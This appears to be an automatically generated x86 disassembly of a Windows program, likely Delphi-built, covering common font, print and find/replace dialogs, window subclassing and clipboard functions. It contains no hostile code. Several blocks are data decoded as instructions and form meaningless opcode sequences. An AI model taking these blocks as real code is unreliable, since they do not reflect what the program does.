je r-xdata
or [ ebp - 0x30 ] 0x200
mov eax [ ebx + 0x58 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] sub_43a0a4
mov eax [ ebx + 0x68 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x6c ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x10 ]
jge r-xdata
or [ ebp - 0x30 ] 0x10
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x40 ] eax
mov esi [ rw-data ]
mov [ rw-data ] ebx
mov [ ebx + 0x71 ] 0x0
mov [ ebx + 0x70 ] 0x0
lea ecx [ ebp - 0x44 ]
mov edx ChooseFontA
mov eax ebx
mov edi [ eax ]
call [ edi + 0x38 ]
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebp - 0x1 ] al
mov [ rw-data ] esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
and [ ebp - 0x30 ] 0xffffdfff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a404
lea eax [ ebp - 0x84 ]
call sub_40442c
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
lea eax [ ebp - 0x84 ]
lea edx [ ebp - 0x64 ]
mov ecx 0x20
call sub_404694
mov edx [ ebp - 0x84 ]
mov eax [ ebp - 0x8 ]
call sub_408800
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43a420
cmp [ ebx + 0x71 ] 0x0
je r-xdata
mov [ ebx + 0x70 ] 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx + 0x58 ]
call sub_421514
sub_43a420
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43a4bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
lea edx [ edi + 0x1c ]
mov ecx 0x20
call sub_404694
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_42173c
mov edx [ edi ]
mov eax [ esi + 0x58 ]
call sub_4216fc
cmp [ esi + 0x70 ] 0x0
je r-xdata
mov bl [ r-xdata ]
cmp [ edi + 0x10 ] 0x190
jle r-xdata
mov dl [ edi + 0x17 ]
mov eax [ esi + 0x58 ]
call sub_421844
cmp [ edi + 0x14 ] 0x0
je r-xdata
or bl 0x1
cmp [ edi + 0x15 ] 0x0
je r-xdata
or bl 0x2
cmp [ edi + 0x16 ] 0x0
je r-xdata
or bl 0x4
mov edx ebx
mov eax [ esi + 0x58 ]
call sub_4217e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a4c4
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
or bl 0x8
sub_43a4d0
push ebp
mov ebp esp
add esp 0xfffff3fc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
lea eax [ ebp - 0xc04 ]
push eax
push ebx
call sub_42c008
lea ecx [ ebp - 0x804 ]
lea edx [ ebp - 0x404 ]
call sub_42b80c
cmp [ ebx ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x404 ]
call sub_408f90
mov ebx eax
add ebx 0x8
lea eax [ ebp - 0x804 ]
call sub_408f90
add ebx eax
lea eax [ ebp - 0xc04 ]
call sub_408f90
add ebx eax
add ebx 0x3
push ebx
push 0x42
call GlobalAlloc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_43a5c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx esi
add ebx 0x8
mov edi esi
mov eax ebx
sub ax si
mov [ edi ] ax
lea edx [ ebp - 0x804 ]
mov eax ebx
call sub_408ff4
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x2 ] ax
lea edx [ ebp - 0x404 ]
mov eax ebx
call sub_408ff4
inc eax
mov ebx eax
mov eax ebx
sub ax si
mov [ edi + 0x4 ] ax
lea edx [ ebp - 0xc04 ]
mov eax ebx
call sub_408fcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call GlobalUnlock
retn
sub_43a5d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_43a640
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi ebx
movzx eax [ esi + 0x4 ]
mov edi ebx
add eax edi
push eax
mov eax [ ebp - 0x4 ]
push eax
call sub_42c008
movzx ecx [ esi ]
add ecx edi
movzx edx [ esi + 0x2 ]
add edx edi
call sub_42b8b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a647
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalFree
retn
sub_43a650
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GlobalSize
mov ebx eax
push ebx
push 0x42
call GlobalAlloc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor edx edx
push ebp
push sub_43a6d2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov esi eax
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
retn
test eax eax
je r-xdata
mov edx eax
mov eax esi
mov ecx ebx
call sub_4028fc
sub_43a6e8
push ebx
add esp 0xffffffb8
mov ebx eax
lea eax [ esp + 0x4 ]
xor ecx ecx
mov edx 0x42
call sub_402fc4
mov [ esp + 0x4 ] 0x42
mov eax [ rw-data ]
mov [ esp + 0x26 ] eax
lea edx [ esp + 0x10 ]
mov eax esp
call sub_43a4d0
mov eax [ esp ]
call sub_43a650
mov [ esp + 0xc ] eax
mov [ esp + 0x18 ] 0x2040
mov [ esp + 0x32 ] sub_4393f4
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x4 ]
mov edx PrintDlgA
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp eax 0x1
sbb eax eax
inc eax
mov ebx eax
test bl bl
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
call sub_43a5d4
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push eax
call GlobalFree
mov eax ebx
add esp 0x48
pop ebx
retn
push eax
call GlobalFree
sub_43a7c6
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax + 0x58004460 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax - 0x63ffbbbd ] bh
pop [ eax + eax + 0x60 ]
pop eax
inc esp
add [ edx + ebp * 2 + 0x3e3c0041 ] al
inc esp
add [ edx + edx ] dh
inc esp
add [ ebp + eax * 2 + 0x44 ] bl
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ edx + eax * 2 - 0x754fffbc ] dl
inc esp
add ah cl
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4c ] eax
test [ eax + eax - 0x5c ] eax
add [ eax + eax - 0x10 ] 0xf
inc esp
add ah dh
cmove eax [ eax ]
or al 0x40
inc esp
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add [ eax ] bh
sbb al 0x44
add [ edi + ebx + 0x44 ] cl
add al bh
sbb eax 0xa9100044
inc ebx
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax - 0x2c ] 0x45
inc esp
add [ esp + ecx * 2 + 0x44 ] dl
add al al
pop ecx
inc esp
add ah ch
test al 0x43
add [ esi + edx * 2 + 0x550c0044 ] ah
inc esp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ ecx + ebx * 2 ] dl
inc esp
add [ eax + ebx * 2 - 0x7b67ffbc ] bh
inc esp
add [ ebx ] al
inc esp
add [ ecx + eax * 4 + 0x44 ] dl
add [ esp + eax * 4 ] al
inc esp
add [ ecx ] al
add [ ecx ] ah
mov al 0x4c
test eax 0x54110043
push edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
les ebp [ eax + 0x11070043 ]
push esp
push edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xa7e0776f
inc ebx
add [ eax - 0x21 ] dl
inc ebx
add [ ebx ] cl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_4453e0
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
sub_43a910
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_445f34
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_43a954
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_43a990
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463088
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_43a954
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4630ac
jmp r-xdata
push ebp
call sub_43a954
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463088
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463088
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4630ac
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_4630ac
jmp r-xdata
sub_43aa44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_4393f4
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_43ad04
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_43ad6c
push eax
mov eax esi
call sub_43ad04
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_43ad6c
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_43a990
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_43aacc
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43945c
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_43aa44
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43ab76
add [ eax ] al
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40dabc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4394a4
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_43abcc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_43ec78
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_43ac08
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_43aa44
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_444294
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_43abcc
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_448484
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_43ad1c
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_43ad84
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4394d8
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_4038bc
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_4038bc
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_448484
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_43ae7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4048dc
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_409020
pop esi
pop ebx
retn
sub_43aea0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4048dc
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_409020
pop esi
pop ebx
retn
sub_43aec4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43aacc
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_43afa8
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_4096b0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_43b043
add [ edi ] cl
add [ eax ] al
add [ eax + 0x6a ] al
dec eax
add [ esp + edx * 8 + 0x48 ] dl
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 2 ] bh
dec eax
add [ eax - 0x2a ] ch
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] bh
push 0x48
add [ esp + edx * 8 ] bl
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 2 ] dh
dec eax
add [ edi + edx * 8 + 0x48 ] cl
add [ eax ] al
xor [ edx + 0x48 ] ch
add [ eax + 0x48d6 ] cl
add [ eax ] al
add [ edx + ebp * 2 ] ch
dec eax
add [ eax ] dh
salc
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] ch
push 0x48
add [ edi + edx * 8 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 2 ] ah
dec eax
add [ ebp + edx * 8 + 0x48 ] cl
add [ eax ] al
and [ edx + 0x48 ] ch
add [ eax - 0x2a ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 2 ] bl
dec eax
add [ ebp + edx * 8 + 0x48 ] ch
add [ eax ] al
sbb [ edx + 0x48 ] ch
add [ eax + ebx * 8 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add ah ah
imul ecx [ eax ] rw-data
add [ eax ] al
add [ eax ] al
loopne r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b155
retn
dec eax
add [ edi + edx * 8 + 0x48 ] ch
add [ eax ] al
add [ eax ] al
add ah bl
imul ecx [ eax ] rw-data
add [ eax ] al
add [ eax ] al
fsubr [ ecx + 0x48 ]
add ah ch
aad 0x48
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43b14e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404f0c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_43b188
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
mov cl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
mov cl 0x43
add [ eax ] dl
add [ eax ] al
add [ eax + 0x800413a ] al
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x6a ] bl
inc ecx
add [ eax ] ah
mov ch 0x43
add [ eax + 0x6b ] dh
inc ecx
add [ eax + 0x40043b6 ] dl
mov bl 0x43
add [ edx + esi * 4 ] bl
inc ebx
add [ edx + esi * 4 + 0x43 ] bh
add [ eax + 0xa0043b2 ] ch
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
nop
cld
mov cl 0x43
add [ edi ] al
or dl [ ebx + eax * 2 + 0x6c ]
imul esi [ eax + 0x62 ] 0x6472616f
shl [ ecx + 0x3af40043 ] 0x1
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_43b254
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b25b
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_43b27c
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_41f398
sub_43b2a8
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_43b6fc
call sub_41f2e4
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
sub_43b304
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_43b324
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43b396
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_40442c
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_40461c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b39d
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_43b3a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_43b446
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40c05c
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_424950
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_424860
call sub_403f38
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b454
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_43b4ac
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b4b3
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_43b4bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_43b511
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b518
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_43b520
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_43b3a4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_43b454
jmp r-xdata
mov edx ebx
mov eax esi
call sub_416b68
mov edx ebx
mov eax esi
call sub_43b4bc
jmp r-xdata
pop esi
pop ebx
retn
sub_43b588
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_43b5fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43b260
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_424924
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b604
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
